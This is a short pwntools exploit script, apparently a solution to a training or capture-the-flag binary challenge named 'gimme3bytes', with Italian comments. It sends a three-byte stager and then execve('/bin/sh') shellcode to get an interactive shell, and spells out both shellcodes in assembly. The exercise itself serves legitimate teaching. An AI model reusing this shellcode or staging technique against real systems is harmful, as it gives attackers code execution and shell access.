from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    r = process("./gimme3bytes")
    gdb.attach(r, """
            #b *0x004011f1       # è l'indirizzo della call in Ghidra di buf che vediamo nel codice
            c
                  """)
    input("wait")
else:
    r = remote("bin.training.offdef.it", 2004)

r.send(b"\x5A\x0F\x05") 

input("wait")

r.send(b"\x90\x90\x90\x48\x89\xF7\x48\x83\xC7\x19\x48\xC7\xC0\x3B\x00\x00\x00\x48\x31\xF6\x48\x31\xD2\x0F\x05/bin/sh\x00") #Ci sono 3 nop come la lunghezza del vecchio shellcode

r.interactive()

'''
Il problema è che ho una read di 3 bytes e quindi se mettessi solo uno shellcode normale verrebbe male impostato rdx e quindi il nbytes conterrebbe un indirizzo, invece 
facendo così prendiamo il primo valore sullo stack e lo mettiamo su rdx che adesso lo considera un numero e quindi nbytes contiene un numero e va bene.
Gli altri registri che servono per la read sono già tutti ben settati di default
PRIMO SHELLCODE =
pop rdx
syscall

Questo shellcode è quello classico per l'execve più i tre nop dello shellcode precedente 
SECONDO SHELLCODE =
nop
nop
nop
mov    rdi,rsi
add    rdi,25     # 22 di questo shellcode + 3 dell'altro shellcode
mov    rax,0x3b
xor    rsi,rsi
xor    rdx,rdx
syscall

'''